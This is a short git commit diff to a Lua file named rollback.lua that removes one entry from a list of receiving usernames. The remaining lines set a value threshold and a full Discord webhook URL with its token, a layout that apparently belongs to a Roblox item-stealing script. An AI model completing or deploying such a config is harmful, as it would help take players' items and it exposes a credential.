5801be73ab586ba2f8dd59a2bb18e4824770b144
asiazzz <rubianiasia0@gmail.com>
2026-01-07 22:54:35 +0100

    Update rollback.lua

--- rollback.lua
+++ rollback.lua
@@ -1,4 +1,4 @@
-_G.Usernames = {"L0LADOPT", "asia0276"} -- you can add as many as you'd like
+_G.Usernames = {"L0LADOPT"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1458519646222417934/K91HbptSTYoqYkv41JDuL2ibD1VGzyTxrUKT5B3Tfg-5YUScHtzk8vE6rxHIdej7x8bF" -- change to your webhook
